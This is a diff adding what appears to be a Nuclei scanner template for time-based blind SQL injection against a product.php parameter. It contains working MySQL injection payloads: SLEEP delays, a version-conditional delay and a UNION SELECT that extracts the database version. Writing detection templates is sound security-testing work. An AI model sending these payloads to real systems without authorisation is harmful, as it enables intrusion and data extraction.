@@ -1,0 +1,35 @@
+id: sql-injection-time-based
+
+info:
+  name: SQL Injection Time-Based Detection
+  author: DAAKU
+  severity: high
+  description: Detects blind SQL injection using time delays and verifies with actual data extraction
+  tags: sqli,blind,time-based
+
+http:
+  - raw:
+      - |
+        GET /product.php?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        GET /product.php?id=1' AND (SELECT 1234 FROM (SELECT(SLEEP(IF(@@version like '8%',5,0))))a)-- HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        GET /product.php?id=1' UNION SELECT NULL,CONCAT('SQLI_PROOF:',@@version),NULL-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration_1 >= 5"  # First request takes at least 5 seconds
+          - "duration_2 >= 5"  # Second request takes at least 5 seconds
+          
+      - type: word
+        part: body
+        words:
+          - "SQLI_PROOF:"
+        condition: or
